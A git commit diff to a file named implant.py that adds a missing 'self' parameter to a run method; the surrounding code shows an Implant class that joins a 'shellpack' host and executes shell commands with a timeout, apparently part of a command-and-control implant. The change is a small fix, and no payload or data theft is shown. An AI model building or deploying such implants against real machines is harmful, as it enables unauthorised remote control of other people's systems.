3160e5d23e8b5ea1aa55854accd985f9f1c7974b
Vaughn Woerpel <vaughnwoerpel@gmail.com>
2023-10-14 23:25:43 -0400

    update

--- implant.py
+++ implant.py
@@ -19,7 +19,7 @@ class Implant(Host):
     def join(self, shellpack):
         self.send(shellpack['ip'], "join")
 
-    def run(cmd, timeout_sec):
+    def run(self, cmd, timeout_sec):
         proc = Popen(shlex.split(cmd), stdout=PIPE, stderr=PIPE)
         timer = Timer(timeout_sec, proc.kill)
         try:
